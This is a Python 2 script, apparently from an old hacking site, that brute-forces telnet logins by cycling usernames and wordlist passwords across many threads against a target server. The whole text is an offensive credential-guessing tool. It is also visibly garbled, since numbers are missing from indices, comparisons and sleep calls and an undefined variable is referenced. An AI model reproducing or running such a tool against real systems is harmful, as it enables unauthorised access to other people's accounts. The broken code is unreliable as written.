#!usr/bin/python
#Telnet Brute Forcer
#http://www.darkcde.com
#dhydr[at]gmail[dot]com
import threading, time, random, sys, telnetlib
from copy import copy
if len(sys.argv) !=:
  print "Usage: ./telnetbrute.py <server> <userlist> <wordlist>"
  sys.exit()
try:
  users = open(sys.argv[], "r").readlines()
except(IOError):
  print "Error: Check your userlist path\n"
  sys.exit()
try:
  words = open(sys.argv[], "r").readlines()
except(IOError):
  print "Error: Check your wordlist path\n"
  sys.exit()
print "\n\t  dhydr[at]gmail[dot]com TelnetBruteForcer v."
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"
wordlist = copy(words)
def reloader():
  for word in wordlist:
    words.append(word)
def getword():
  lock = threading.Lock()
  lock.acquire()
  if len(words) != :
    value = random.sample(words, )
    words.remove(value[])
  else:
    print "\nReloading Wordlist - Changing User\n"
    reloader()
    value = random.sample(words, )
    users.remove(users[])
  lock.release()
  if len(users) ==:
    return value[][:-], users[]
  else:
    return value[][:-], users[][:-]
class Worker(threading.Thread):
  def run(self):
    value, user = getword()
    try:
      print "-"*
      print "User:",user,"Password:",value
      tn = telnetlib.Telnet(sys.argv[])
      tn.read_until("login: ")
      tn.write(user + "\n")
      if password:
          tn.read_until("Password: ")
          tn.write(value + "\n")
      tn.write("ls\n")
      tn.write("exit\n")
      print tn.read_all()
      print "\t\nLogin successful:",value, user
      tn.close()
      work.join()
      sys.exit()
    except:
      pass
for I in range(len(words)*len(users)):
  work = Worker()
  work.start()
  time.sleep()